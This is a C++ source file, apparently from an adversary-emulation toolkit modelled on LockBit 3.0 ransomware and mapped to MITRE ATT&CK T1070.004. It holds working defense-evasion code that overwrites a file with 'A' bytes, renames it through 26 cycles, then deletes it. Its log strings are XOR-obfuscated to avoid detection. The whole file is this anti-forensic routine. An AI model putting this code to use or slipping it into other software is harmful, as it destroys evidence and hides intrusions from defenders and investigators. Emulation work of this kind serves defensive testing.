#include <filesystem>
#include <format>
#include <stdexcept>
#include <string>
#include "crypto/xor_obfuscation.hpp"
#include "defense_evasion.hpp"
#include "logger.hpp"
#include "util/os_util.hpp"
#include "util/string_util.hpp"
#include <Windows.h>
#include <fileapi.h>

#define SELF_DEL_CHUNK_SIZE 4096

namespace defense_evasion {

/*
 * RenameCycleFile:
 *      About:
 *          Renames the given file by cycling from the letters A to Z, to reach a total of 26 renaming actions.
 *          The entire filename is replaced by the same letter, repeating that letter throughout the entire
 *          filename's length, including the extension. So a filename C:\path\test.exe will be renamed to
 *          C:\path\AAAAAAAA, C:\path\BBBBBBBB, ... C:\path\ZZZZZZZZ. The function returns the final filename.
 *          File renaming is done using the Windows API call MoveFileW.
 *      Result:
 *          File named from AA..AA all the way to ZZ..ZZ.
 *      Returns:
 *          Final file path of the renamed file.
 *      MITRE ATT&CK Techniques:
 *          T1070.004: Indicator Removal: File Deletion
 *      CTI:
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 */
std::wstring RenameCycleFile(const std::wstring& path_str) {
    std::filesystem::path path(path_str);
    std::filesystem::path dir = path.parent_path();
    std::string file_name = path.filename().string();
    size_t file_name_len = file_name.size();
    std::wstring new_path_str;
    std::filesystem::path new_path;
    std::filesystem::path old_path = path;
    for (char c = 'A'; c <= 'Z'; c++) {
        new_path = dir / std::filesystem::path(std::string(file_name_len, c));
        new_path_str = new_path.wstring();
        if (!MoveFileW(old_path.wstring().c_str(), new_path_str.c_str())) {
            throw std::runtime_error(std::format(
                "Failed to rename {} to {}. Error code: {}", 
                old_path.string(), 
                new_path.string(), 
                GetLastError()
            ));
        }
        XorLogger::LogDebug(std::format("Renamed {} to {}.", string_util::wstring_to_string(path_str), new_path.string()));
        old_path = std::filesystem::path(new_path);
    }
    return new_path_str;
}

/*
 * OverWriteRenameAndDeleteFile:
 *      About:
 *          Overwrites the given file with "A" characters, then renames it by cycling from the letters A to Z, 
 *          for a total of 26 renaming actions, then deletes the file from disk.
 *          When renaming, the entire filename is replaced by the same letter, repeating that letter throughout the entire
 *          filename's length, including the extension. So a filename C:\path\test.exe will be renamed to
 *          C:\path\AAAAAAAA, C:\path\BBBBBBBB, ... C:\path\ZZZZZZZZ. The function returns the final filename.
 *          File access and writes are done using the CreateFileW and WriteFile API calls.
 *          File renaming is done using the Windows API call MoveFileW.
 *          File deletion is done using the DeleteFileW API call;
 *      Result:
 *          Overwritten, renamed, and deleted file
 *      Returns:
 *          True on success, false on failure.
 *      MITRE ATT&CK Techniques:
 *          T1070.004: Indicator Removal: File Deletion
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 */
bool OverWriteRenameAndDeleteFile(const std::wstring& path) {
    // Overwrite file
    DWORD error_code;
    std::string path_narrow = string_util::wstring_to_string(path);
    HANDLE h_file = CreateFileW(
        path.c_str(),
        FILE_READ_ATTRIBUTES | GENERIC_WRITE,
        0, 
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING,
        NULL
    );
    if (h_file == INVALID_HANDLE_VALUE) {
        error_code = GetLastError();
        if (error_code == ERROR_FILE_NOT_FOUND) {
            XorLogger::LogError(std::format("File {} {}.", path_narrow, XOR_LIT("not found. Could not overwrite, rename, and delete")));
        } else {
            XorLogger::LogError(std::format("{} {}. Error code: {}", XOR_LIT("Could not access file"), path_narrow, error_code));
        }
        return false;
    }
    LARGE_INTEGER size_struct;
    if (!GetFileSizeEx(h_file, &size_struct)) {
        error_code = GetLastError();
        CloseHandle(h_file);
        XorLogger::LogError(std::format("{} {}. Error code: {}", XOR_LIT("Failed to get size for file"), path_narrow, error_code));
        return false;
    }
    LONGLONG size = size_struct.QuadPart;
    char buffer[SELF_DEL_CHUNK_SIZE];
    LONGLONG count = 0;
    memset(buffer, 'A', SELF_DEL_CHUNK_SIZE);
    do {
        error_code = os_util::WriteFileBytes(h_file, buffer, SELF_DEL_CHUNK_SIZE);
        if (error_code != ERROR_SUCCESS) {
            CloseHandle(h_file);
            XorLogger::LogError(std::format("{} {}. Error code: {}", XOR_LIT("Failed to overwrite file"), path_narrow, error_code));
            return false;
        }
        count += SELF_DEL_CHUNK_SIZE;
    } while (count <= size);
    XorLogger::LogDebug(std::format("Overwrote {} with {} {} {}).", path_narrow, count, XOR_LIT("bytes (original size:"), size));
    CloseHandle(h_file);

    // rename from AA..AA to ZZ..ZZ
    std::wstring new_path;
    try {
        new_path = RenameCycleFile(path);
    } catch (const std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to rename file"), e.what()));
        return false;
    }
    
    // delete file using DeleteFileW
    if (!DeleteFileW(new_path.c_str())) {
        XorLogger::LogError(std::format("{} {}. Error code: {}", XOR_LIT("Failed to overwrite file"), path_narrow, GetLastError()));
        return false;
    } else {
        XorLogger::LogDebug(std::format("{} {} after renaming it.", XOR_LIT("Deleted file"), path_narrow));
        return true;
    }
}

} // namespace